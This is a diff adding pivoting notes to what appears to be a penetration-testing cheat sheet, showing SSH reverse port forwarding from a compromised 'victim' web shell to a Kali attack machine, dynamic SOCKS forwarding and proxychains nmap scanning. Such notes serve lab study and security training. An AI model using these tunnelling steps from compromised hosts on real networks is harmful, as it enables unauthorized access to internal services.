@@ -66,7 +66,42 @@ To confirm if we can reach the desired host and port, run **nmap** with **proxyc
 
 ```bash
 proxychains nmap localhost
+```
 
+#### SSH
+
+##### Reverse proxy (From victim server to attack)
+
+If we have a service which we cannot access from the outside, we can establish a port forwarding enabling SSH in our kali machine and establishing a connection from the victim machine. First, we need to enable SSH
+
+```bash
+kali $ sudo systemctl start ssh
+```
+
+And now we can set up a reverse port forward from the attack machine. Eg: exposing port 60002
+
+```bash
+www-data@milan:/home$ ssh -R *:60002:localhost:60002 kali@192.168.45.245
+```
+
+Now we have access from our kali machine
+
+```bash
+kali $ curl localhost:60002
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+[...SNIP...]
+```
+
+##### Dynamic port forwarding
+
+From our attack machine to the victim machine:
+
+```bash
+ssh -D 8081 root@10.129.160.194
 ```
 
 #### Windows - Firewall problems
